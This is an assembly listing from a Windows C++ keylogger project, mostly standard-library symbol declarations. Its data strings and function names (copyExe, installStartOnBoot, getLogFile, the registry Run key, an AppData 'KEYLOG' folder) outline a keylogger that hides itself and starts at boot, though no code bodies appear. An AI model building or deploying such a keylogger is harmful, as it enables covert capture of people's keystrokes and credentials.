; Listing generated by Microsoft (R) Optimizing Compiler Version 19.29.30136.0 

	TITLE	c:\Users\jacob\Development\Keylogger\main.asm.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?keypress_buf@@3Ukeypress_buf_t@@A		; keypress_buf
PUBLIC	?keypress_buf_loc@@3IA				; keypress_buf_loc
_BSS	SEGMENT
?keypress_buf@@3Ukeypress_buf_t@@A DB 0dH DUP (?)	; keypress_buf
	ALIGN	4

?keypress_buf_loc@@3IA DD 01H DUP (?)			; keypress_buf_loc
_BSS	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
	ORG $+3
$SG120064 DB	'APPDATA', 00H
$SG120065 DB	'\KEYLOG\', 00H
	ORG $+3
$SG120071 DB	'keylog.exe', 00H
	ORG $+1
$SG120091 DB	'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 00H
	ORG $+2
$SG120092 DB	'Keylogger', 00H
	ORG $+2
$SG120851 DB	'log', 00H
CONST	ENDS
PUBLIC	??2@YAPAXIPAX@Z					; operator new
PUBLIC	??0exception@std@@QAE@QBD@Z			; std::exception::exception
PUBLIC	??0exception@std@@QAE@QBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QAE@ABV01@@Z			; std::exception::exception
PUBLIC	??1exception@std@@UAE@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UBEPBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UAEPAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AAE@QBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UAE@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QAE@ABV01@@Z			; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UAEPAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QAE@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UAE@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QAE@ABV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UAEPAXI@Z		; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?max@?$numeric_limits@H@std@@SAHXZ		; std::numeric_limits<int>::max
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAAPAXAAI@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	??$_Convert_size@I@std@@YAII@Z			; std::_Convert_size<unsigned int>
PUBLIC	?_Orphan_all@_Container_base0@std@@QAEXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Swap_proxy_and_iterators@_Container_base0@std@@QAEXAAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z	; std::_Char_traits<char,int>::copy
PUBLIC	?move@?$_Char_traits@DH@std@@SAPADQADQBDI@Z	; std::_Char_traits<char,int>::move
PUBLIC	?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z	; std::_Narrow_char_traits<char,int>::length
PUBLIC	?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
PUBLIC	?to_char_type@?$_Narrow_char_traits@DH@std@@SADABH@Z ; std::_Narrow_char_traits<char,int>::to_char_type
PUBLIC	?to_int_type@?$_Narrow_char_traits@DH@std@@SAHABD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
PUBLIC	?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NABH0@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
PUBLIC	?not_eof@?$_Narrow_char_traits@DH@std@@SAHABH@Z	; std::_Narrow_char_traits<char,int>::not_eof
PUBLIC	?eof@?$_Narrow_char_traits@DH@std@@SAHXZ	; std::_Narrow_char_traits<char,int>::eof
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@D@std@@QAE@XZ			; std::allocator<char>::allocator<char>
PUBLIC	?deallocate@?$allocator@D@std@@QAEXQADI@Z	; std::allocator<char>::deallocate
PUBLIC	?allocate@?$allocator@D@std@@QAEPADI@Z		; std::allocator<char>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAIABV?$allocator@D@2@@Z ; std::_Default_allocator_traits<std::allocator<char> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@ABV32@@Z ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
PUBLIC	?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged
PUBLIC	?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEXI@Z ; std::_String_val<std::_Simple_types<char> >::_Check_offset
PUBLIC	?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ ; std::_String_val<std::_Simple_types<char> >::_Xran
PUBLIC	?_Clamp_suffix_size@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEIII@Z ; std::_String_val<std::_Simple_types<char> >::_Clamp_suffix_size
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty
PUBLIC	??1?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::~_String_val<std::_Simple_types<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXABV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Memcpy_val_from
PUBLIC	?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents
PUBLIC	?_Construct_lv_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXABV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct_lv_contents
PUBLIC	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::assign
PUBLIC	?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::assign
PUBLIC	?_Erase_noexcept@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV12@II@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Erase_noexcept
PUBLIC	?erase@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@II@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::erase
PUBLIC	?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back
PUBLIC	?front@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::front
PUBLIC	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
PUBLIC	?data@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::data
PUBLIC	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
PUBLIC	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
PUBLIC	?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
PUBLIC	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
PUBLIC	?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_init
PUBLIC	?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators
PUBLIC	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
PUBLIC	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEABV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAEAAV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QBEABV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::~_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>
PUBLIC	??0runtime_error@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::runtime_error::runtime_error
PUBLIC	??1runtime_error@std@@UAE@XZ			; std::runtime_error::~runtime_error
PUBLIC	??0runtime_error@std@@QAE@ABV01@@Z		; std::runtime_error::runtime_error
PUBLIC	??_Gruntime_error@std@@UAEPAXI@Z		; std::runtime_error::`scalar deleting destructor'
PUBLIC	?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z ; std::make_error_code
PUBLIC	?iostream_category@std@@YAABVerror_category@1@XZ ; std::iostream_category
PUBLIC	??1error_category@std@@UAE@XZ			; std::error_category::~error_category
PUBLIC	?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z ; std::error_category::default_error_condition
PUBLIC	?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z ; std::error_category::equivalent
PUBLIC	?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z ; std::error_category::equivalent
PUBLIC	??8error_category@std@@QBE_NABV01@@Z		; std::error_category::operator==
PUBLIC	??0error_code@std@@QAE@HABVerror_category@1@@Z	; std::error_code::error_code
PUBLIC	?value@error_code@std@@QBEHXZ			; std::error_code::value
PUBLIC	?category@error_code@std@@QBEABVerror_category@2@XZ ; std::error_code::category
PUBLIC	?message@error_code@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::error_code::message
PUBLIC	??0error_condition@std@@QAE@HABVerror_category@1@@Z ; std::error_condition::error_condition
PUBLIC	?value@error_condition@std@@QBEHXZ		; std::error_condition::value
PUBLIC	?category@error_condition@std@@QBEABVerror_category@2@XZ ; std::error_condition::category
PUBLIC	??8std@@YA_NABVerror_condition@0@0@Z		; std::operator==
PUBLIC	?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z ; std::_System_error::_Makestr
PUBLIC	??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_System_error::_System_error
PUBLIC	??1_System_error@std@@UAE@XZ			; std::_System_error::~_System_error
PUBLIC	??0_System_error@std@@QAE@ABV01@@Z		; std::_System_error::_System_error
PUBLIC	??_G_System_error@std@@UAEPAXI@Z		; std::_System_error::`scalar deleting destructor'
PUBLIC	??0system_error@std@@QAE@Verror_code@1@PBD@Z	; std::system_error::system_error
PUBLIC	??1system_error@std@@UAE@XZ			; std::system_error::~system_error
PUBLIC	??0system_error@std@@QAE@ABV01@@Z		; std::system_error::system_error
PUBLIC	??_Gsystem_error@std@@UAEPAXI@Z			; std::system_error::`scalar deleting destructor'
PUBLIC	?name@_Iostream_error_category2@std@@UBEPBDXZ	; std::_Iostream_error_category2::name
PUBLIC	?message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ; std::_Iostream_error_category2::message
PUBLIC	??1_Iostream_error_category2@std@@UAE@XZ	; std::_Iostream_error_category2::~_Iostream_error_category2
PUBLIC	??_G_Iostream_error_category2@std@@UAEPAXI@Z	; std::_Iostream_error_category2::`scalar deleting destructor'
PUBLIC	??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@0@XZ ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>
PUBLIC	??0bad_cast@std@@QAE@XZ				; std::bad_cast::bad_cast
PUBLIC	??1bad_cast@std@@UAE@XZ				; std::bad_cast::~bad_cast
PUBLIC	??0bad_cast@std@@QAE@ABV01@@Z			; std::bad_cast::bad_cast
PUBLIC	??_Gbad_cast@std@@UAEPAXI@Z			; std::bad_cast::`scalar deleting destructor'
PUBLIC	?_Throw_bad_cast@std@@YAXXZ			; std::_Throw_bad_cast
PUBLIC	??1_Facet_base@std@@UAE@XZ			; std::_Facet_base::~_Facet_base
PUBLIC	??0_Facet_base@std@@QAE@XZ			; std::_Facet_base::_Facet_base
PUBLIC	??_G_Facet_base@std@@UAEPAXI@Z			; std::_Facet_base::`scalar deleting destructor'
PUBLIC	??0_Locinfo@std@@QAE@PBD@Z			; std::_Locinfo::_Locinfo
PUBLIC	??1_Locinfo@std@@QAE@XZ				; std::_Locinfo::~_Locinfo
PUBLIC	?_Getctype@_Locinfo@std@@QBE?AU_Ctypevec@@XZ	; std::_Locinfo::_Getctype
PUBLIC	??0?$_Yarn@D@std@@QAE@XZ			; std::_Yarn<char>::_Yarn<char>
PUBLIC	??1?$_Yarn@D@std@@QAE@XZ			; std::_Yarn<char>::~_Yarn<char>
PUBLIC	?c_str@?$_Yarn@D@std@@QBEPBDXZ			; std::_Yarn<char>::c_str
PUBLIC	?_Tidy@?$_Yarn@D@std@@AAEXXZ			; std::_Yarn<char>::_Tidy
PUBLIC	??0?$_Yarn@_W@std@@QAE@XZ			; std::_Yarn<wchar_t>::_Yarn<wchar_t>
PUBLIC	??1?$_Yarn@_W@std@@QAE@XZ			; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
PUBLIC	?_Tidy@?$_Yarn@_W@std@@AAEXXZ			; std::_Yarn<wchar_t>::_Tidy
PUBLIC	??0id@locale@std@@QAE@I@Z			; std::locale::id::id
PUBLIC	??Bid@locale@std@@QAEIXZ			; std::locale::id::operator unsigned int
PUBLIC	?_Incref@facet@locale@std@@UAEXXZ		; std::locale::facet::_Incref
PUBLIC	?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ ; std::locale::facet::_Decref
PUBLIC	??0facet@locale@std@@IAE@I@Z			; std::locale::facet::facet
PUBLIC	??1facet@locale@std@@MAE@XZ			; std::locale::facet::~facet
PUBLIC	??_Gfacet@locale@std@@MAEPAXI@Z			; std::locale::facet::`scalar deleting destructor'
PUBLIC	??0locale@std@@QAE@ABV01@@Z			; std::locale::locale
PUBLIC	??0locale@std@@QAE@XZ				; std::locale::locale
PUBLIC	??1locale@std@@QAE@XZ				; std::locale::~locale
PUBLIC	?c_str@locale@std@@QBEPBDXZ			; std::locale::c_str
PUBLIC	?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z	; std::locale::_Getfacet
PUBLIC	??_Glocale@std@@QAEPAXI@Z			; std::locale::`scalar deleting destructor'
PUBLIC	??0codecvt_base@std@@QAE@I@Z			; std::codecvt_base::codecvt_base
PUBLIC	?always_noconv@codecvt_base@std@@QBE_NXZ	; std::codecvt_base::always_noconv
PUBLIC	??1codecvt_base@std@@UAE@XZ			; std::codecvt_base::~codecvt_base
PUBLIC	?do_always_noconv@codecvt_base@std@@MBE_NXZ	; std::codecvt_base::do_always_noconv
PUBLIC	?do_max_length@codecvt_base@std@@MBEHXZ		; std::codecvt_base::do_max_length
PUBLIC	?do_encoding@codecvt_base@std@@MBEHXZ		; std::codecvt_base::do_encoding
PUBLIC	??_Gcodecvt_base@std@@UAEPAXI@Z			; std::codecvt_base::`scalar deleting destructor'
PUBLIC	??$_Adl_verify_range@PBDPBD@std@@YAXABQBD0@Z	; std::_Adl_verify_range<char const *,char const *>
PUBLIC	??$min@H@std@@YAABHABH0@Z			; std::min<int>
PUBLIC	??0ctype_base@std@@QAE@I@Z			; std::ctype_base::ctype_base
PUBLIC	??1ctype_base@std@@UAE@XZ			; std::ctype_base::~ctype_base
PUBLIC	??_Gctype_base@std@@UAEPAXI@Z			; std::ctype_base::`scalar deleting destructor'
PUBLIC	?widen@?$ctype@D@std@@QBEDD@Z			; std::ctype<char>::widen
PUBLIC	??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z		; std::ctype<char>::ctype<char>
PUBLIC	?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z ; std::ctype<char>::_Getcat
PUBLIC	??1?$ctype@D@std@@MAE@XZ			; std::ctype<char>::~ctype<char>
PUBLIC	?_Init@?$ctype@D@std@@IAEXABV_Locinfo@2@@Z	; std::ctype<char>::_Init
PUBLIC	?_Tidy@?$ctype@D@std@@IAEXXZ			; std::ctype<char>::_Tidy
PUBLIC	?do_tolower@?$ctype@D@std@@MBEDD@Z		; std::ctype<char>::do_tolower
PUBLIC	?do_tolower@?$ctype@D@std@@MBEPBDPADPBD@Z	; std::ctype<char>::do_tolower
PUBLIC	?do_toupper@?$ctype@D@std@@MBEDD@Z		; std::ctype<char>::do_toupper
PUBLIC	?do_toupper@?$ctype@D@std@@MBEPBDPADPBD@Z	; std::ctype<char>::do_toupper
PUBLIC	?do_widen@?$ctype@D@std@@MBEDD@Z		; std::ctype<char>::do_widen
PUBLIC	?do_widen@?$ctype@D@std@@MBEPBDPBD0PAD@Z	; std::ctype<char>::do_widen
PUBLIC	?do_narrow@?$ctype@D@std@@MBEDDD@Z		; std::ctype<char>::do_narrow
PUBLIC	?do_narrow@?$ctype@D@std@@MBEPBDPBD0DPAD@Z	; std::ctype<char>::do_narrow
PUBLIC	??_G?$ctype@D@std@@MAEPAXI@Z			; std::ctype<char>::`scalar deleting destructor'
PUBLIC	??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z ; std::use_facet<std::ctype<char> >
PUBLIC	??$_Adl_verify_range@PADPBD@std@@YAXABQADABQBD@Z ; std::_Adl_verify_range<char *,char const *>
PUBLIC	??0failure@ios_base@std@@QAE@PBDABVerror_code@2@@Z ; std::ios_base::failure::failure
PUBLIC	??1failure@ios_base@std@@UAE@XZ			; std::ios_base::failure::~failure
PUBLIC	??0failure@ios_base@std@@QAE@ABV012@@Z		; std::ios_base::failure::failure
PUBLIC	??_Gfailure@ios_base@std@@UAEPAXI@Z		; std::ios_base::failure::`scalar deleting destructor'
PUBLIC	?clear@ios_base@std@@QAEXH_N@Z			; std::ios_base::clear
PUBLIC	?clear@ios_base@std@@QAEXH@Z			; std::ios_base::clear
PUBLIC	?rdstate@ios_base@std@@QBEHXZ			; std::ios_base::rdstate
PUBLIC	?good@ios_base@std@@QBE_NXZ			; std::ios_base::good
PUBLIC	?flags@ios_base@std@@QBEHXZ			; std::ios_base::flags
PUBLIC	?getloc@ios_base@std@@QBE?AVlocale@2@XZ		; std::ios_base::getloc
PUBLIC	?swap@ios_base@std@@QAEXAAV12@@Z		; std::ios_base::swap
PUBLIC	??1ios_base@std@@UAE@XZ				; std::ios_base::~ios_base
PUBLIC	??0ios_base@std@@IAE@XZ				; std::ios_base::ios_base
PUBLIC	?_Init@ios_base@std@@IAEXXZ			; std::ios_base::_Init
PUBLIC	??_Gios_base@std@@UAEPAXI@Z			; std::ios_base::`scalar deleting destructor'
PUBLIC	??$addressof@Vios_base@std@@@std@@YAPAVios_base@0@AAV10@@Z ; std::addressof<std::ios_base>
PUBLIC	??$swap@H$0A@@std@@YAXAAH0@Z			; std::swap<int,0>
PUBLIC	??$swap@_J$0A@@std@@YAXAA_J0@Z			; std::swap<__int64,0>
PUBLIC	??$swap@PAU_Iosarray@ios_base@std@@$0A@@std@@YAXAAPAU_Iosarray@ios_base@0@0@Z ; std::swap<std::ios_base::_Iosarray *,0>
PUBLIC	??$swap@PAU_Fnarray@ios_base@std@@$0A@@std@@YAXAAPAU_Fnarray@ios_base@0@0@Z ; std::swap<std::ios_base::_Fnarray *,0>
PUBLIC	??$swap@PAVlocale@std@@$0A@@std@@YAXAAPAVlocale@0@0@Z ; std::swap<std::locale *,0>
PUBLIC	??$_Fgetc@D@std@@YA_NAADPAU_iobuf@@@Z		; std::_Fgetc<char>
PUBLIC	??$_Fputc@D@std@@YA_NDPAU_iobuf@@@Z		; std::_Fputc<char>
PUBLIC	??$_Ungetc@D@std@@YA_NABDPAU_iobuf@@@Z		; std::_Ungetc<char>
PUBLIC	?getOriginalFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ ; getOriginalFileName
PUBLIC	?getInstallDirectory@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ ; getInstallDirectory
PUBLIC	?getNewFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ ; getNewFileName
PUBLIC	?createInstallDirectory@@YAXXZ			; createInstallDirectory
PUBLIC	?copyExe@@YAXXZ					; copyExe
PUBLIC	?installStartOnBoot@@YAXXZ			; installStartOnBoot
PUBLIC	?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ ; getLogFile
PUBLIC	??1?$basic_ios@DU?$char_traits@D@std@@@std@@UAE@XZ ; std::basic_ios<char,std::char_traits<char> >::~basic_ios<char,std::char_traits<char> >
PUBLIC	?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::clear
PUBLIC	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
PUBLIC	?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::tie
PUBLIC	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
PUBLIC	?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z ; std::basic_ios<char,std::char_traits<char> >::widen
PUBLIC	?swap@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXAAV12@@Z ; std::basic_ios<char,std::char_traits<char> >::swap
PUBLIC	?init@?$basic_ios@DU?$char_traits@D@std@@@std@@IAEXPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@_N@Z ; std::basic_ios<char,std::char_traits<char> >::init
PUBLIC	??0?$basic_ios@DU?$char_traits@D@std@@@std@@IAE@XZ ; std::basic_ios<char,std::char_traits<char> >::basic_ios<char,std::char_traits<char> >
PUBLIC	??_G?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z ; std::basic_ios<char,std::char_traits<char> >::`scalar deleting destructor'
PUBLIC	??0?$basic_istream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@_N@Z ; std::basic_istream<char,std::char_traits<char> >::basic_istream<char,std::char_traits<char> >
PUBLIC	??1?$basic_istream@DU?$char_traits@D@std@@@std@@UAE@XZ ; std::basic_istream<char,std::char_traits<char> >::~basic_istream<char,std::char_traits<char> >
PUBLIC	??_G?$basic_istream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z ; std::basic_istream<char,std::char_traits<char> >::`scalar deleting destructor'
PUBLIC	??_D?$basic_istream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_istream<char,std::char_traits<char> >::`vbase destructor'
PUBLIC	??0?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@W4_Uninitialized@1@_N@Z ; std::basic_ostream<char,std::char_traits<char> >::basic_ostream<char,std::char_traits<char> >
PUBLIC	??1?$basic_ostream@DU?$char_traits@D@std@@@std@@UAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::~basic_ostream<char,std::char_traits<char> >
PUBLIC	?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
PUBLIC	?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z ; std::basic_ostream<char,std::char_traits<char> >::write
